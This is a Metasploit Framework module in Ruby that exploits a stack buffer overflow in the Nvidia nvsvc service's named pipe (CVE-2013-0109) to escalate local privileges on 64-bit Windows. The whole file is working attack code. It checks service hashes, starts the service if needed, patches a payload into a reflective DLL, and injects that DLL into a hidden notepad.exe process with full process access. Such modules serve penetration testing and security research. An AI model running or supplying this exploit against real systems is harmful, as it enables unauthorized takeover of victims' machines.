##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/process'
require 'msf/core/post/windows/services'

class Metasploit3 < Msf::Exploit::Local
	Rank = AverageRanking

	include Msf::Post::File
	include Msf::Post::Windows::Priv
	include Msf::Post::Windows::Process
	include Msf::Post::Windows::Services

	def initialize(info={})
		super(update_info(info, {
			'Name'           => 'Nvidia (nvsvc) Display Driver Service Local Privilege Escalation',
			'Description'    => %q{
				The named pipe, \pipe\nsvr, has a NULL DACL allowing any authenticated user can
				interact with the service. The service has a stacked based buffer overflow as a result
				of a memmove operation.
			
				N.B. exe is nvvsvc.exe, service is nvsvc and pipe is nsvr!

				This exploit automatically targets nvvsvc.exe versions dated Nov 3 2011, Aug 30 2012, and Dec 1 2012.
				It has been tested on Win7 x64 against nvvsvc.exe dated Dec 1 2012.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Peter Wintersmith', # Original exploit
					'Ben Campbell <eat_meatballs[at]hotmail.co.uk>',   # Metasploit integration
				],
			'Arch'           => ARCH_X86_64,
			'Platform'       => 'win',
			'SessionTypes'   => [ 'meterpreter' ],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Targets'        =>
				[
					[ 'Automatic', { } ]
				],
			'Payload'        =>
				{
					'Space'       => 2048,
					'DisableNops' => true
				},
			'References'     =>
				[
					[ 'CVE', '2013-0109' ],
					[ 'OSVDB', '88745' ],
					[ 'URL', 'http://nvidia.custhelp.com/app/answers/detail/a_id/3288' ],
				],
			'DisclosureDate' => 'Dec 25 2012',
			'DefaultTarget'  => 0
		}))

	end

	def check
		vuln_hashes = [ '43f91595049de14c4b61d1e76436164f',
				'3947ad5d03e6abcce037801162fdb90d',
				'3341d2c91989bc87c3c0baa97c27253b' ]

		os = sysinfo["OS"]
		if os =~ /windows/i
			svc = service_info 'nvsvc'
			if svc and svc['Name'] =~ /NVIDIA/i
				vprint_good("Found service '#{svc['Name']}'")

				begin
					unless is_running?
						print_error("Service is not running!")
					else
						print_good("Service is running")
					end
				rescue RuntimeError => e
					print_error("Unable to retrieve service status")
				end
				
				if sysinfo['Architecture'] =~ /WOW64/i
					# Unable to check the file in System32 (Need to add a DisableWOW64FSRedirection option to meterp!)
					return Exploit::CheckCode::Detected
				else
					path = svc['Command'].strip
				end
			
				begin
					hash = client.fs.file.md5(path).unpack('H*').first
				rescue Rex::Post::Meterpreter::RequestError => e
					print_error("Error checking file hash: #{e}")
					return Exploit::CheckCode::Detected
				end

				if vuln_hashes.include?(hash)
					vprint_good("Hash '#{hash}' is listed as vulnerable")
					return Exploit::CheckCode::Vulnerable
				else	
					vprint_status("Hash '#{hash}' is not recorded as vulnerable")
					return Exploit::CheckCode::Detected
				end
			else
				return Exploit::CheckCode::Safe
			end
		end
	end

        def create_proc
                windir = expand_path("%windir%")
                cmd = "#{windir}\\system32\\notepad.exe"
                return session.sys.process.execute(cmd, nil, {'Hidden' => true }).pid
        end
	
	def is_running?
                begin
                        status = service_status('nvsvc')
			return (status and status[:state] == 4)
                rescue RuntimeError => e
                        print_error("Unable to retrieve service status")
			return false
                end

	end

	def exploit
		unless is_running?
			print_error("Service not running - attempting to start")
			res = service_start('nvsvc')
			case res
			when 0
				print_good("Service started")
			when 1
				print_status("Service already started")
			else
				fail_with(Exploit::Failure::Unknown, "Unable to start service")
			end
		else
			print_good("Service is running")
		end
	
                dll = ''
                offset = nil
                file = File.join(Msf::Config.install_root, "data", "exploits", "CVE-2013-0109", "exploit.dll")
                File.open( file,"rb" ) { |f| dll += f.read(f.stat.size) }

                pay = payload.encoded

                bo = dll.index('PAYLOAD:')
                raise RuntimeError, "Invalid Win32 PE DLL template: missing \"PAYLOAD:\" tag" if not bo
               	dll[bo, pay.length] = [pay].pack("a*")

                pe = Rex::PeParsey::Pe.new( Rex::ImageSource::Memory.new( dll ) )

                pe.exports.entries.each do |entry|
                        if( entry.name =~ /^\S*ReflectiveLoader\S*/ )
                                offset = pe.rva_to_file_offset( entry.rva )
                                break
                        end
                end

                print_error("No offset found") unless offset

                new_pid = create_proc

                if not new_pid
                        fail_with(Exploit::Failure::Unknown, "Failed to create a new process")
                end

                vprint_status("Injecting payload into memory")
                host_process = session.sys.process.open(new_pid.to_i, PROCESS_ALL_ACCESS)
                mem = host_process.memory.allocate(dll.length + (dll.length % 1024))
                host_process.memory.protect(mem)
                host_process.memory.write(mem, dll)
		print_status("Executing exploit...")
		host_process.thread.create(mem+offset)
	end
end

